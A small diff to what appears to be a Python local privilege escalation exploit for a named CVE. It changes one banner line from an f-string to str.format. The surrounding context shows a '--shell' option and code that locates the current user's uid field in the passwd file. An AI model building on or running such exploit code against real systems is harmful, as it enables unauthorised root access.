@@ -126,7 +126,7 @@ def main(argv: list[str]) -> int:
     user    = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
     do_exec = "--shell" in argv
 
-    print(f"[*] CVE-2026-31431 LPE  user={user}  uid={os.getuid()}")
+    print("[*] CVE-2026-31431 LPE  user={}  uid={}".format(user, os.getuid()))
 
     try:
         uid_off, uid_str = find_uid_field(PASSWD, user)
